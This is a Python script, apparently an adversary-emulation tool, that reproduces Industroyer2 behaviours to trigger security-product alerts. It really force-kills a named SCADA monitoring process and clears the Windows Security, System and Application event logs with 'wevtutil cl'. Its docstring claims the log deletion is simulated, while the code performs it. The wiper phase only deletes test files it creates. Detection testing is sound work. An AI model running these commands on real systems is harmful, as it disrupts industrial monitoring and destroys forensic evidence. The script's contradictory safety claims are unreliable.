#!/usr/bin/env python3
"""
Industroyer2 Characteristics Simulation
Replicates specific behaviors of the real Industroyer2 malware

Real Industroyer2 Characteristics:
1. Process Termination - Killed PService_PPD.exe (SCADA monitoring process)
2. Scheduled Execution - Waited until specific time to execute
3. Anti-Forensics - Deleted event logs
4. CaddyWiper Integration - Destroyed data after IEC-104 attack

This simulation implements these characteristics for educational/detection testing.

WARNING: For authorized security testing only!

Usage:
    python3 industroyer2_characteristics.py [--mode MODE]
"""

import os
import sys
import time
import argparse
import logging
import subprocess
import platform
import shutil
from datetime import datetime
from pathlib import Path

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [INDUSTROYER2-CHAR] - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('Industroyer2Characteristics')


class Industroyer2Characteristics:
    """
    Simulates distinctive characteristics of Industroyer2 malware
    Used for testing detection capabilities of security products
    """

    def __init__(self, target_process='PService_PPD.exe', wipe_targets=None):
        self.target_process = target_process
        self.wipe_targets = wipe_targets or []
        self.is_windows = platform.system() == 'Windows'
        self.execution_log = []

    def banner(self):
        """Display banner"""
        logger.info("=" * 80)
        logger.info("INDUSTROYER2 CHARACTERISTICS SIMULATION")
        logger.info("=" * 80)
        logger.info("Simulating distinctive Industroyer2 malware behaviors:")
        logger.info("  1. SCADA Process Termination (PService_PPD.exe)")
        logger.info("  2. Scheduled Execution (Time-based trigger)")
        logger.info("  3. Event Log Deletion (Anti-Forensics)")
        logger.info("  4. CaddyWiper Integration (Data Destruction)")
        logger.info("=" * 80)
        logger.warning("[!] This is a SIMULATION for authorized security testing only")
        logger.info("=" * 80)

    def terminate_scada_process(self):
        """
        Phase 1: Terminate SCADA monitoring process

        Real Industroyer2:
        - Terminated PService_PPD.exe before launching IEC-104 attack
        - This was the PowerSystemDistributed service monitoring process
        - Prevented operators from seeing the attack in real-time

        This simulation:
        - Searches for target process (e.g., PService_PPD.exe)
        - Terminates it forcefully
        - Generates process termination alerts
        """
        logger.info("\n[PHASE 1] SCADA PROCESS TERMINATION")
        logger.info("-" * 80)
        logger.info(f"[*] Target Process: {self.target_process}")

        if self.is_windows:
            try:
                # Check if process exists
                logger.info(f"[*] Searching for {self.target_process}...")
                cmd_check = f'tasklist /FI "IMAGENAME eq {self.target_process}" /FO CSV /NH'
                result = subprocess.run(cmd_check, shell=True, capture_output=True, text=True)

                if self.target_process.lower() in result.stdout.lower():
                    logger.warning(f"[!] Process {self.target_process} found - terminating...")

                    # Forcefully terminate the process
                    cmd_kill = f'taskkill /F /IM {self.target_process}'
                    logger.info(f"[*] Executing: {cmd_kill}")

                    result = subprocess.run(cmd_kill, shell=True, capture_output=True, text=True)

                    if result.returncode == 0:
                        logger.critical(f"[!!!] SUCCESS: {self.target_process} terminated")
                        logger.warning("[!] EXPECTED ALERT: Cortex XDR - Critical Process Termination")
                        logger.warning("[!] EXPECTED ALERT: Cortex XDR - SCADA Service Disruption")
                        logger.warning("[!] EXPECTED ALERT: XSIAM - Industroyer2 Behavior Pattern")
                        self.execution_log.append(f"Terminated {self.target_process}")
                    else:
                        logger.error(f"[-] Failed to terminate {self.target_process}")
                        logger.info(result.stderr)
                else:
                    logger.warning(f"[!] Process {self.target_process} not found")
                    logger.info("[*] This is expected if the process is not running")
                    logger.info(f"[*] To test detection, start {self.target_process} first")

            except Exception as e:
                logger.error(f"[-] Error: {e}")

        else:
            # Linux process termination
            logger.info("[*] Linux platform detected")
            logger.info(f"[*] Attempting to terminate {self.target_process}...")

            try:
                # Try pkill
                cmd = f'pkill -9 -f {self.target_process}'
                logger.info(f"[*] Executing: {cmd}")
                result = subprocess.run(cmd, shell=True)

                if result.returncode == 0:
                    logger.warning(f"[!] Process matching '{self.target_process}' terminated")
                    self.execution_log.append(f"Terminated {self.target_process}")
                else:
                    logger.info(f"[*] No process matching '{self.target_process}' found")

            except Exception as e:
                logger.error(f"[-] Error: {e}")

        time.sleep(2)

    def scheduled_execution_check(self, target_hour=None, target_minute=None):
        """
        Phase 2: Scheduled Execution Simulation

        Real Industroyer2:
        - Was configured to execute at a specific time (coordinated attack)
        - Used scheduled tasks or internal timing logic
        - Maximized impact by timing with grid operator shift changes

        This simulation:
        - Checks current time against target execution time
        - Simulates waiting for scheduled time
        - Can be configured to execute at specific hour/minute
        """
        logger.info("\n[PHASE 2] SCHEDULED EXECUTION CHECK")
        logger.info("-" * 80)

        current_time = datetime.now()
        logger.info(f"[*] Current Time: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")

        if target_hour is not None and target_minute is not None:
            logger.info(f"[*] Configured Target Time: {target_hour:02d}:{target_minute:02d}")

            if current_time.hour == target_hour and current_time.minute == target_minute:
                logger.critical(f"[!!!] TARGET TIME REACHED - Proceeding with attack")
                logger.warning("[!] EXPECTED ALERT: Suspicious timing behavior")
                return True
            else:
                logger.info("[*] Target time not yet reached - would wait")
                logger.info("[*] Simulation: Skipping wait for demo purposes")
                return False
        else:
            logger.info("[*] No scheduled time configured - executing immediately")
            logger.info("[*] Real Industroyer2 waited for specific time")
            return True

    def delete_event_logs(self):
        """
        Phase 3: Event Log Deletion (Anti-Forensics)

        Real Industroyer2:
        - Deleted Windows Event Logs to cover tracks
        - Cleared Security, System, Application logs
        - Made forensic investigation more difficult

        This simulation:
        - Simulates event log deletion attempts
        - Generates anti-forensics alerts
        - Does NOT actually delete real event logs (safe for demo)
        """
        logger.info("\n[PHASE 3] EVENT LOG DELETION (ANTI-FORENSICS)")
        logger.info("-" * 80)

        if not self.is_windows:
            logger.info("[*] Skipping event log deletion - not on Windows")
            return

        # Event logs that Industroyer2 targeted
        log_names = ['Security', 'System', 'Application']

        for log_name in log_names:
            logger.info(f"[*] Attempting to clear {log_name} event log...")

            # ACTUALLY clear the event log (requires admin privileges)
            cmd = f'wevtutil cl {log_name}'
            logger.warning(f"[!] Executing: {cmd}")
            logger.warning("[!] This WILL delete event logs and trigger alerts!")

            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)

                if result.returncode == 0:
                    logger.critical(f"[!!!] SUCCESS: {log_name} event log cleared")
                else:
                    logger.error(f"[-] Failed to clear {log_name} event log")
                    logger.error(f"[-] Error: {result.stderr}")
                    logger.info("[-] This requires Administrator privileges")

            except subprocess.TimeoutExpired:
                logger.error(f"[-] Timeout while clearing {log_name}")
            except Exception as e:
                logger.error(f"[-] Exception: {e}")

            time.sleep(0.5)

        logger.warning("[!] EXPECTED ALERT: Cortex XDR - Event Log Tampering")
        logger.warning("[!] EXPECTED ALERT: Cortex XDR - Anti-Forensics Behavior")
        logger.warning("[!] EXPECTED ALERT: XSIAM - Security Event Log Deletion")

        self.execution_log.append("Simulated event log deletion")
        time.sleep(2)

    def caddywiper_simulation(self):
        """
        Phase 4: CaddyWiper Data Destruction

        Real CaddyWiper (deployed with Industroyer2):
        - Destroyed user data and system files
        - Overwrote disk partitions
        - Rendered systems unbootable
        - Deployed after Industroyer2 completed IEC-104 attack

        This simulation:
        - Creates test "configuration" folders
        - Destroys them to simulate data wiping
        - Generates data destruction alerts
        - Safe for testing (only destroys test folders)
        """
        logger.info("\n[PHASE 4] CADDYWIPER DATA DESTRUCTION SIMULATION")
        logger.info("-" * 80)

        # Create test configuration folder if doesn't exist
        config_dir = Path("./test_configuration_files")

        logger.info(f"[*] Configuration Folder: {config_dir.absolute()}")

        # Create the test folder with files
        if not config_dir.exists():
            logger.info("[*] Creating test configuration folder...")
            config_dir.mkdir(parents=True, exist_ok=True)

            # Create test files
            test_files = [
                ('scada_config.xml', '<config><server>192.168.1.55</server></config>'),
                ('database_backup.sql', 'SELECT * FROM critical_data;'),
                ('system_settings.ini', '[Settings]\nBackupPath=C:\\Backups'),
                ('credential_store.dat', 'ENCRYPTED_DATA_PLACEHOLDER'),
                ('operational_data.csv', 'timestamp,sensor,value\n2024-01-01,temp,25.5'),
            ]

            for filename, content in test_files:
                file_path = config_dir / filename
                file_path.write_text(content)
                logger.info(f"    [+] Created: {filename}")

        else:
            logger.info("[*] Test configuration folder already exists")

        # List files before destruction
        files_before = list(config_dir.glob('*'))
        logger.info(f"\n[*] Files before destruction: {len(files_before)}")
        for file in files_before:
            logger.info(f"    - {file.name} ({file.stat().st_size} bytes)")

        # Simulate CaddyWiper destruction
        logger.warning("\n[!!!] INITIATING CADDYWIPER DATA DESTRUCTION")
        logger.warning("[!] Destroying configuration files...")

        time.sleep(1)

        try:
            # Overwrite files with random data (CaddyWiper technique)
            for file in files_before:
                if file.is_file():
                    logger.warning(f"    [WIPE] Overwriting {file.name}...")

                    # Overwrite with zeros (simulated)
                    with open(file, 'wb') as f:
                        f.write(b'\x00' * 1024)  # Write 1KB of zeros

                    time.sleep(0.2)

            # Delete the entire folder
            logger.critical(f"[!!!] Deleting folder: {config_dir}")
            shutil.rmtree(config_dir)

            logger.critical("[!!!] DATA DESTRUCTION COMPLETE")
            logger.warning("[!] EXPECTED ALERT: Cortex XDR - Data Destruction / Wiper Activity")
            logger.warning("[!] EXPECTED ALERT: Cortex XDR - Ransomware-like Behavior")
            logger.warning("[!] EXPECTED ALERT: XSIAM - CaddyWiper TTP Detected")
            logger.warning("[!] EXPECTED ALERT: WildFire - Destructive Payload")

            self.execution_log.append("CaddyWiper simulation completed")

        except Exception as e:
            logger.error(f"[-] Error during wiper simulation: {e}")

        time.sleep(2)

    def run_all(self):
        """Execute all Industroyer2 characteristics"""
        self.banner()
        time.sleep(2)

        # Phase 1: Terminate SCADA process
        self.terminate_scada_process()

        # Phase 2: Check scheduled execution time
        self.scheduled_execution_check()

        # Phase 3: Delete event logs (anti-forensics)
        self.delete_event_logs()

        # Phase 4: Run CaddyWiper simulation
        self.caddywiper_simulation()

        # Summary
        logger.info("\n" + "=" * 80)
        logger.info("INDUSTROYER2 CHARACTERISTICS SIMULATION COMPLETE")
        logger.info("=" * 80)
        logger.info("Executed behaviors:")
        for i, action in enumerate(self.execution_log, 1):
            logger.info(f"  {i}. {action}")
        logger.info("")
        logger.info("Expected Security Alerts:")
        logger.info("  - Cortex XDR: Process Termination, Anti-Forensics, Data Destruction")
        logger.info("  - XSIAM: Industroyer2 Attack Pattern Correlation")
        logger.info("  - WildFire: Malicious Payload Analysis")
        logger.info("=" * 80)


def main():
    parser = argparse.ArgumentParser(
        description='Industroyer2 Characteristics Simulation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run all characteristics
  python3 industroyer2_characteristics.py

  # Terminate specific process
  python3 industroyer2_characteristics.py --process my_scada_process.exe

  # Run only process termination
  python3 industroyer2_characteristics.py --mode terminate

  # Run only CaddyWiper simulation
  python3 industroyer2_characteristics.py --mode wiper

WARNING: For authorized security testing only!
        """
    )

    parser.add_argument('--mode', choices=['all', 'terminate', 'scheduled', 'logs', 'wiper'],
                        default='all',
                        help='Which characteristic to simulate (default: all)')
    parser.add_argument('--process', default='PService_PPD.exe',
                        help='Target process name to terminate (default: PService_PPD.exe)')
    parser.add_argument('--target-hour', type=int,
                        help='Scheduled execution hour (0-23)')
    parser.add_argument('--target-minute', type=int,
                        help='Scheduled execution minute (0-59)')

    args = parser.parse_args()

    simulator = Industroyer2Characteristics(target_process=args.process)

    if args.mode == 'all':
        simulator.run_all()
    elif args.mode == 'terminate':
        simulator.banner()
        simulator.terminate_scada_process()
    elif args.mode == 'scheduled':
        simulator.banner()
        simulator.scheduled_execution_check(args.target_hour, args.target_minute)
    elif args.mode == 'logs':
        simulator.banner()
        simulator.delete_event_logs()
    elif args.mode == 'wiper':
        simulator.banner()
        simulator.caddywiper_simulation()


if __name__ == '__main__':
    main()
